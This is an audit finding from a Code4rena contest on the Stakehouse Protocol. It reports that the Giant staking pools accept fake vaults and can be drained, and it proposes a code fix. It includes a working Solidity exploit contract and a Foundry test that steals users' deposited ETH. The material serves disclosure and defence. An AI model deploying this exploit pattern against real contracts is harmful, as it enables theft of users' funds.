---
# Core Classification
protocol: Stakehouse Protocol
chain: everychain
category: access_control
vulnerability_type: access_control

# Attack Vector Details
attack_type: access_control
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 5904
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest
source_link: https://code4rena.com/reports/2022-11-stakehouse
github_link: https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.80
financial_impact: high

# Scoring
quality_score: 4
rarity_score: 3

# Context Tags
tags:
  - access_control

protocol_categories:
  - liquid_staking
  - dexes
  - cdp
  - services
  - cross_chain

# Audit Details
report_date: unknown
finders_count: 22
finders:
  - clems4ever
  - c7e7eff
  - JTJabba
  - Trust
  - arcoun
---

## Vulnerability Title

[H-17] Giant pools can be drained due to weak vault authenticity check

### Overview


This bug report is about a vulnerability in the GiantSavETHVaultPool and GiantMevAndFeesPool contracts, which form part of the Stakehouse project. The vulnerability allows an attacker to withdraw all ETH staked by users in a Giant pool. 

The vulnerability is caused by a check in the `batchDepositETHForStaking` function in the Giant pools. This function checks whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes. An attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract.

The recommended mitigation step is to consider taking a list of `LiquidStakingManager` addresses instead of vault addresses. This would prevent the exploit contract from being able to return a valid staking manager contract address.

### Original Finding Content


<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50><br>
<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44>

An attacker can withdraw all ETH staked by users in a Giant pool. Both `GiantSavETHVaultPool` and `GiantMevAndFeesPool` are affected.

### Proof of Concept

The `batchDepositETHForStaking` function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)):

```solidity
SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);
require(
    liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),
    "Invalid liquid staking manager"
);

// Deposit ETH for staking of BLS key
savETHPool.batchDepositETHForStaking{ value: transactionAmount }(
    _blsPublicKeys[i],
    _stakeAmounts[i]
);
```

An attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:

```solidity
// test/foundry/GiantPools.t.sol
contract GiantPoolExploit {
    address immutable owner = msg.sender;
    address validStakingManager;

    constructor(address validStakingManager_) {
        validStakingManager = validStakingManager_;
    }

    function liquidStakingManager() public view returns (address) {
        return validStakingManager;
    }

    function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {
        payable(owner).transfer(address(this).balance);
    }
}

function testPoolDraining_AUDIT() public {
    // Register BLS key
    address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);
    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);

    // Set up users and ETH
    address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);

    address attacker = address(0x1337);
    vm.label(attacker, "attacker");
    vm.deal(attacker, 1 ether);

    // User deposits ETH into Giant savETH
    vm.prank(savETHUser);
    giantSavETHPool.depositETH{value: 24 ether}(24 ether);
    assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);
    assertEq(address(giantSavETHPool).balance, 24 ether);

    // Attacker deploys an exploit.
    vm.startPrank(attacker);
    GiantPoolExploit exploit = new GiantPoolExploit(address(manager));
    vm.stopPrank();

    // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.
    bytes[][] memory blsKeysForVaults = new bytes[][](1);
    blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);

    uint256[][] memory stakeAmountsForVaults = new uint256[][](1);
    stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);

    giantSavETHPool.batchDepositETHForStaking(
        getAddressArrayFromValues(address(exploit)),
        getUint256ArrayFromValues(24 ether),
        blsKeysForVaults,
        stakeAmountsForVaults
    );

    // Vault got nothing.
    assertEq(address(manager.savETHVault()).balance, 0 ether);
    // Attacker has stolen user's deposit.
    assertEq(attacker.balance, 25 ether);
}
```

### Recommended Mitigation Steps

Consider taking a list of `LiquidStakingManager` addresses instead of vault addresses:

```diff
--- a/contracts/liquid-staking/GiantSavETHVaultPool.sol
+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol
@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {
     /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding
     /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding
     function batchDepositETHForStaking(
-        address[] calldata _savETHVaults,
+        address[] calldata _liquidStakingManagers,
         uint256[] calldata _ETHTransactionAmounts,
         bytes[][] calldata _blsPublicKeys,
         uint256[][] calldata _stakeAmounts
     ) public {
-        uint256 numOfSavETHVaults = _savETHVaults.length;
+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;
         require(numOfSavETHVaults > 0, "Empty arrays");
         require(numOfSavETHVaults == _ETHTransactionAmounts.length, "Inconsistent array lengths");
         require(numOfSavETHVaults == _blsPublicKeys.length, "Inconsistent array lengths");
@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {

         // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator
         for (uint256 i; i < numOfSavETHVaults; ++i) {
+            require(
+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),
+                "Invalid liquid staking manager"
+            );
+
             uint256 transactionAmount = _ETHTransactionAmounts[i];

             // As ETH is being deployed to a savETH pool vault, it is no longer idle
             idleETH -= transactionAmount;

-            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);
-            require(
-                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),
-                "Invalid liquid staking manager"
-            );
+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));
+            SavETHVault savETHPool = liquidStakingManager.savETHVault();

             // Deposit ETH for staking of BLS key
             savETHPool.batchDepositETHForStaking{ value: transactionAmount }(
```

**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251#issuecomment-1329428177)**



***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 4/5 |
| Rarity Score | 3/5 |
| Audit Firm | Code4rena |
| Protocol | Stakehouse Protocol |
| Report Date | N/A |
| Finders | clems4ever, c7e7eff, JTJabba, Trust, arcoun, Lambda, perseverancesuccess, fs0c, banky, hihen, immeas, satoshipotato, wait, 0xdeadbeef0x, imare, 9svR6w, bitbopper, datapunk, ronnyx2017, Jeiwan, bin2chen, unforgiven |

### Source Links

- **Source**: https://code4rena.com/reports/2022-11-stakehouse
- **GitHub**: https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251
- **Contest**: https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest

### Keywords for Search

`Access Control`

